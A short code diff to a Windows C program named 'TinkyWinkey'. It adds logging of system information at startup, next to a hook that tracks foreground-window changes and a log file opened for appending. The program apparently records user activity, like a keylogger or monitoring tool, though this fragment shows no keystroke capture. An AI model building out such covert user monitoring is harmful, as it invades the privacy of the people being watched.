@@ -59,6 +59,9 @@ int WINAPI	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		SetFilePointer(fd, 0, NULL, FILE_END);
 	else
 		return 1;
+	write_to_file("TinkyWinkey started, getting system information...\n");
+	get_windows_info();
+	write_to_file("--------------------------------\n");
 	HWINEVENTHOOK hook = SetWinEventHook(
 		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
 		NULL,
